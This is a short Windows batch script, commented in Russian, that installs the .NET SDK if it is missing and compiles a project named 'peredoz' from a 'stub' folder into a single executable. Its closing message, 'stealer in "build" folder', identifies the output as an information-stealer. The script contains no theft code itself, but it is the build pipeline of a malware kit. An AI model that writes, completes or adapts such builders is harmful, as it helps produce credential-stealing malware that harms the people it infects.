@echo off
title Building

dotnet --info >nul 2>&1
if %errorlevel% neq 0 (
    echo .NET SDK not found. Installing via winget...
    winget install --id Microsoft.DotNet.SDK.8 --silent --accept-source-agreements --accept-eula
    if %errorlevel% neq 0 (
        echo Failed to install .NET SDK. Please install it manually and try again.
        pause
        exit /b
    )
)

:: build
echo .NET SDK is installed. Proceeding to publish the project...
dotnet publish -c Release -r win-x64 -p:PublishSingleFile=true -p:PublishTrimmed=true stub\peredoz.sln

:: Создаем папку build, если её нет
set "BUILD_FOLDER=%~dp0build"
if not exist "%BUILD_FOLDER%" (
    mkdir "%BUILD_FOLDER%"
    if %errorlevel% neq 0 (
        echo Failed to create the build folder.
        pause
        exit /b
    )

)

:: Переносим exe-файл в папку build
set "EXE_SOURCE=stub\bin\Release\net8.0\win-x64\publish\peredoz.exe"
set "EXE_DESTINATION=%BUILD_FOLDER%\peredoz.exe"

if exist "%EXE_SOURCE%" (
    move /Y "%EXE_SOURCE%" "%EXE_DESTINATION%"
    if %errorlevel% neq 0 (
        echo Failed to move the executable file.
        pause
        exit /b
    )
    
) else (
    echo Executable file not found in the expected location.
    pause
    exit /b
)

:: Удаляем папки bin и obj
if exist "stub\bin" (
    rmdir /S /Q "stub\bin"
    if %errorlevel% neq 0 (
        echo Failed to delete the bin folder.
        pause
        exit /b
    )
    
)

if exist "stub\obj" (
    rmdir /S /Q "stub\obj"
    if %errorlevel% neq 0 (
        echo Failed to delete the obj folder.
        pause
        exit /b
    )
    
)

echo.
echo stealer in "build" folder.
echo.

exit